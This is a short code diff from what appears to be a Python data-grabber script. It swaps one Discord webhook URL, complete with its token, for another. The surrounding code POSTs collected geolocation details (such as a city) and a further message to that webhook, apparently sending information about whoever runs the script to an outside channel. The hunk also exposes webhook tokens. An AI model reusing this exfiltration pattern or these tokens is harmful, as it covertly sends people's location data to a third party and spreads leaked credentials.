@@ -64,7 +64,7 @@ geo_info = (
     f"Area {geo.get('city', 'N/A')}\n"
 ) 
 
-webhook_url = "https://discord.com/api/webhooks/1382538585575788614/LTbGQ-TBV7_HnPWVia-QkGQ6f8q_GI77xYx5OCYrhquyf2kkem-N6bWaSN0-Y-N0Anak"
+webhook_url = "https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"
 
 requests.post(webhook_url, json={"content": geo_info})
 requests.post(webhook_url, json=message)
